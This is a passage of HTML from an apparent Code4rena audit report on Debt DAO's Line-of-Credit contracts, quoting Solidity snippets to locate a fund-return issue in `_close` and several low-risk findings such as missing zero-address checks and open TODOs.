2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L489-L493\">modules/credit/LineOfCredit.sol#L489-L493</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"37\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_close</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Credit</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">principal</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) { </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">CloseFailedWithPrincipal</span><span class=\"mtk1\">(); }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// return the Lender&#39;s funds that are being repaid</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">deposit</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">interestRepaid</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">LineLib</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sendOutTokenOrETH</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">deposit</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">interestRepaid</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">delete</span><span class=\"mtk1\"> </span><span class=\"mtk12\">credits</span><span class=\"mtk1\">[</span><span class=\"mtk12\">id</span><span class=\"mtk1\">]; </span><span class=\"mtk3\">// gas refunds</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// remove from active list</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ids</span><span class=\"mtk1\">.</span><span class=\"mtk11\">removePosition</span><span class=\"mtk1\">(</span><span class=\"mtk12\">id</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> { --</span><span class=\"mtk12\">count</span><span class=\"mtk1\">; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// If all credit lines are closed the the overall Line of Credit facility is declared &#39;repaid&#39;.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">count</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) { </span><span class=\"mtk11\">_updateStatus</span><span class=\"mtk1\">(</span><span class=\"mtk12\">LineLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">STATUS</span><span class=\"mtk1\">.</span><span class=\"mtk12\">REPAID</span><span class=\"mtk1\">); }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">CloseCreditPosition</span><span class=\"mtk1\">(</span><span class=\"mtk12\">id</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-15\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-15\" aria-label=\"recommended mitigation steps 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider using a pull-based pattern to allow the lender to withdraw the funds instead of sending them back directly.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/467#issuecomment-1405078929\">kibagateaux (Debt DAO) confirmed</a></strong></p>\n<hr>\n<h1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"><a href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk and Non-Critical Issues</h1>\n<p>For this contest, 78 reports were submitted by wardens detailing low risk and non-critical issues. The <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/454\">report highlighted below</a> by <strong>IllIllI</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/511\">ajtra</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/508\">brgltd</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/501\">pashov</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/494\">rbserver</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/483\">c3phas</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/481\">0xNazgul</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/478\">Awesome</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/475\">immeas</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/470\">jumpdest7d</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/468\">Deivitto</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/458\">rotcivegaf</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/449\">lukris02</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/439\">joestakey</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/437\">Josiah</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/436\">djxploit</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/434\">0xSmartContract</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/426\">Trust</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/423\">pedr02b2</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/419\">B2</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/415\">Aymen0909</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/396\">RedOneN</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/395\">cryptostellar5</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/393\">Diana</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/386\">Funen</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/385\">bulej93</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/382\">cryptonue</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/378\">a12jmx</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/377\">delfin454000</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/375\">ctf_sec</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/370\">__141345__</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/366\">minhquanym</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/353\">adriro</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/296\">erictee</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/289\">TomJ</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/279\">zaskoh</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/278\">peanuts</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/263\">merlin</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/251\">btk</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/244\">seyni</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/242\">ReyAdmirado</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/235\">0x1f8b</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/231\">saneryee</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/227\">slowmoses</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/220\">shark</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/218\">HardlyCodeMan</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/199\">apostle0x01</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/198\">tnevler</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/191\">BClabs</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/173\">carlitox477</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/165\">Rahoz</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/158\">sakman</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/155\">gogo</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/151\">0xRoxas</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/148\">catwhiskeys</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/141\">durianSausage</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/137\">csanuragjain</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/131\">fatherOfBlocks</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/118\">trustindistrust</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/115\">Deekshith99</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/108\">w0Lfrum</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/106\">aphak5010</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/103\">Saintcode_</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/101\">Nyx</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/100\">oyc_109</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/91\">i_got_hacked</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/86\">ch0bu</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/77\">rvierdiiev</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/76\">Bnke0x0</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/65\">Rolezn</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/46\">chrisdior4</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/41\">mcwildy</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/35\">HE1M</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/31\">chaduke</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/22\">martin</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/20\">Dinesh11G</a>,\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/9\">yurahod</a>, and\n<a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/4\">RaymondFam</a>.</em></p>\n<h2 id=\"low-risk-issues-summary\" style=\"position:relative;\"><a href=\"#low-risk-issues-summary\" aria-label=\"low risk issues summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk Issues Summary</h2>\n<table>\n<thead>\n<tr>\n<th></th>\n<th align=\"left\">Issue</th>\n<th align=\"center\">Instances</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[L‑01]</td>\n<td align=\"left\">Unused/empty <code>receive()</code>/<code>fallback()</code> function</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td>[L‑02]</td>\n<td align=\"left\">Missing checks for <code>address(0x0)</code> when assigning values to <code>address</code> state variables</td>\n<td align=\"center\">5</td>\n</tr>\n<tr>\n<td>[L‑03]</td>\n<td align=\"left\">Open TODOs</td>\n<td align=\"center\">2</td>\n</tr>\n</tbody>\n</table>\n<p>Total: 8 instances over 3 issues</p>\n<h2 id=\"l01--unusedempty-receivefallback-function\" style=\"position:relative;\"><a href=\"#l01--unusedempty-receivefallback-function\" aria-label=\"l01  unusedempty receivefallback function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L‑01]  Unused/empty <code>receive()</code>/<code>fallback()</code> function</h2>\n<p>If the intention is for the Ether to be used, the function should call another function, otherwise it should revert (e.g. <code>require(msg.sender == address(weth))</code>). Having no access control on the function means that someone may send Ether to the contract, and have no way to get anything back out, which is a loss of funds.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"38\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SpigotedLine</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">272</span><span class=\"mtk1\">:      </span><span class=\"mtk11\">receive</span><span class=\"mtk1\">() </span><span class=\"mtk12\">external</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payable</span><span class=\"mtk1\"> {}</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L272\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L272</a></p>\n<h2 id=\"l02--missing-checks-for-address0x0-when-assigning-values-to-address-state-variables\" style=\"position:relative;\"><a href=\"#l02--missing-checks-for-address0x0-when-assigning-values-to-address-state-variables\" aria-label=\"l02  missing checks for address0x0 when assigning values to address state variables permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L‑02]  Missing checks for <code>address(0x0)</code> when assigning values to <code>address</code> state variables</h2>\n<p><em>There are 5 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"39\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LineOfCredit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">56</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">arbiter</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">arbiter_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">57</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">borrower</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">borrower_</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L56\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L56</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"40\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SpigotedLine</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">66</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">swapTarget</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">swapTarget_</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L66\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L66</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"41\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">escrow</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Escrow</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">49</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">oracle</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_oracle</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">50</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">borrower</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/escrow/Escrow.sol#L49\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/escrow/Escrow.sol#L49</a></p>\n<h2 id=\"l03--open-todos\" style=\"position:relative;\"><a href=\"#l03--open-todos\" aria-label=\"l03  open todos permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L‑03]  Open TODOs</h2>\n<p>Code architecture, incentives, and error handling/reporting questions/issues should be resolved before deployment.</p>\n<p><em>There are 2 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"42\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">factories</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LineFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">140</span><span class=\"mtk1\">:          </span><span class=\"mtk3\">// TODO: test</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">145</span><span class=\"mtk1\">:          </span><span class=\"mtk3\">// TODO: test</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/factories/LineFactory.sol#L140\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/factories/LineFactory.sol#L140</a></p>\n<h2 id=\"non-critical-issues-summary\" style=\"position:relative;\"><a href=\"#non-critical-issues-summary\" aria-label=\"non critical issues summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Non-Critical Issues Summary</h2>\n<table>\n<thead>\n<tr>\n<th></th>\n<th align=\"left\">Issue</th>\n<th align=\"center\">Instances</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[N‑01]</td>\n<td align=\"left\">Duplicate import statements</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td>[N‑02]</td>\n<td align=\"left\">The <code>nonReentrant</code> <code>modifier</code> should occur before all other modifiers</td>\n<td align=\"center\">2</td>\n</tr>\n<tr>\n<td>[N‑03]</td>\n<td align=\"left\">Contract implements interface without extending the interface</td>\n<td 